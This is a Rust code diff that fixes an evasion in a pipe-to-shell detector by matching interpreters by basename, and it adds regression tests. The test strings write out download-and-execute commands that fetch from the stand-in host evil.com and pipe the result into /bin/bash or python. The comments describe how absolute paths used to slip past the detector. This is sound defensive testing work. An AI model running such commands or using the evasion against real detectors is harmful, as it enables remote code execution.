@@ -337,13 +337,28 @@ pub fn check_download_execute_pipe(content: &str) -> Option<u32> {
         .position(|seg| DOWNLOADERS.iter().any(|d| seg.contains(d)))?;
     let has_executor_after = parts[downloader_at + 1..].iter().any(|seg| {
         seg.split_whitespace()
-            .any(|w| EXECUTORS.iter().any(|e| w.trim_start_matches("./") == *e))
+            .any(|w| EXECUTORS.iter().any(|e| executor_basename(w) == *e))
     });
     if has_executor_after {
         Some(40)
     } else {
         None
     }
+}
+
+/// Extract the basename of an executor path so absolute paths match
+/// the same way as bare names. Top-5 #5 (AUDIT-WAVE-T5-5, 2026-05-06):
+/// pre-fix the executor check used `w.trim_start_matches("./") == *e`,
+/// which only normalised the relative `./bash` form. Absolute paths
+/// (`/bin/bash`, `/usr/bin/python3`, `/system/bin/sh`) failed string
+/// equality and slipped through, so an attacker could trivially evade
+/// the pipe-to-shell detector by writing the full path. The fix
+/// strips everything before the last `/` (and the leading `./` for
+/// the relative form) so all of `bash`, `./bash`, `/bin/bash`, and
+/// `/usr/local/bin/bash` collapse to `bash` for comparison.
+fn executor_basename(word: &str) -> &str {
+    let trimmed = word.trim_start_matches("./");
+    trimmed.rsplit('/').next().unwrap_or(trimmed)
 }
 
 /// Check for download-and-execute via staged chmod. Returns score.
@@ -486,6 +501,112 @@ mod tests {
         // Downloader is present, multiple pipe segments follow, but
         // none contain an executor.
         assert!(check_download_execute_pipe("curl http://evil.com/x | grep foo | wc -l").is_none());
+    }
+
+    // ── Top-5 #5 anchors (AUDIT-WAVE-T5-5, 2026-05-06) ─────────────────
+    //
+    // Pre-fix the executor check used `w.trim_start_matches("./") == *e`,
+    // normalising only the relative `./bash` form. Absolute paths slipped
+    // through string equality, so an attacker could trivially evade the
+    // pipe-to-shell detector by writing the full path:
+    //
+    //   curl http://evil.com/x | /bin/bash       <-- evaded pre-fix
+    //   curl http://evil.com/x | /usr/bin/python3 <-- evaded pre-fix
+    //
+    // The fix collapses path-form executors to their basename so
+    // `/bin/bash`, `./bash`, and `bash` all match the same pattern.
+    // These anchors pin the most operationally-relevant evasion shapes
+    // PLUS anti-regression bounds for over-trigger.
+
+    #[test]
+    fn detects_download_pipe_with_absolute_path_executor_bin_bash() {
+        // The exact evasion ultrareview flagged: `/bin/bash`, the most
+        // common absolute path on every Linux distro.
+        assert_eq!(
+            check_download_execute_pipe("curl http://evil.com/x | /bin/bash"),
+            Some(40),
+            "absolute-path /bin/bash MUST trip the detector (was evading pre-fix)"
+        );
+    }
+
+    #[test]
+    fn detects_download_pipe_with_absolute_path_executor_usr_bin_python() {
+        // Same shape, different interpreter — pin every common executor
+        // path so a future change to the EXECUTOR list also gets caught
+        // by the basename normalization. Note: uses bare `python`
+        // (not `python3`) because the EXECUTOR list pins basename
+        // tokens, not version-suffixed variants.
+        assert_eq!(
+            check_download_execute_pipe("wget http://evil.com/x | /usr/bin/python"),
+            Some(40),
+            "absolute-path /usr/bin/python MUST trip the detector"
+        );
+    }
+
+    #[test]
+    fn detects_download_pipe_with_absolute_path_executor_unusual_prefix() {
+        // Unusual prefix (Android-style /system/bin/) the attacker might
+        // pick precisely because it looks unfamiliar. The basename
+        // normalisation is path-agnostic, so this still gets caught.
+        assert_eq!(
+            check_download_execute_pipe("curl http://evil.com/x | /system/bin/sh"),
+            Some(40),
+            "any absolute-path executor MUST trip the detector"
+        );
+    }
+
+    #[test]
+    fn detects_download_pipe_combining_pipe_reorder_and_absolute_path() {
+        // Composes both Top-5 #5 evasions: downloader in the middle of
+        // the pipe (Wave 2 fix territory) AND absolute-path executor
+        // (this fix). Pre-Wave-2 + pre-fix this shape evaded BOTH
+        // checks; the test pins that the two fixes layer correctly.
+        assert_eq!(
+            check_download_execute_pipe("ls | curl http://evil.com/x | /bin/bash -c id"),
+            Some(40),
+            "pipe-reorder + absolute-path together MUST still trip"
+        );
+    }
+
+    #[test]
+    fn does_not_detect_path_lookalike_words() {
+        // Anti-regression bound: the basename strip operates on `/`,
+        // not on similarity. A path-lookalike that does NOT terminate
+        // in an EXECUTOR basename must NOT trip the detector.
+        // `/bin/foo` is not an executor in our list; basename `foo`
+        // does not match. Anti-regression for accidentally widening
+        // the EXECUTOR list to "anything after the last /".
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | /bin/foo").is_none(),
+            "non-executor basename must NOT trip even with absolute path"
+        );
+    }
+
+    #[test]
+    fn does_not_detect_executor_substring_inside_word() {
+        // Anti-regression bound for the basename strip vs equality
+        // comparison. `bashfoo` should NOT trip — basename equality
+        // requires exact match, not substring containment.
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | bashfoo").is_none(),
+            "executor substring inside a longer word must NOT trip"
+        );
+        assert!(
+            check_download_execute_pipe("curl http://evil.com/x | /usr/bin/bashfoo").is_none(),
+            "absolute-path executor substring must NOT trip either"
+        );
+    }
+
+    #[test]
+    fn detects_download_pipe_with_executor_first_arg_after_basename() {
+        // Mirror of `bash -c id` shape: the executor binary appears
+        // first in the segment, followed by args. Pins that
+        // split_whitespace()'s first token is what gets basename-checked.
+        assert_eq!(
+            check_download_execute_pipe("curl http://evil.com/x | /bin/bash -c 'whoami'"),
+            Some(40),
+            "absolute-path executor with args must still trip"
+        );
     }
 
     #[test]
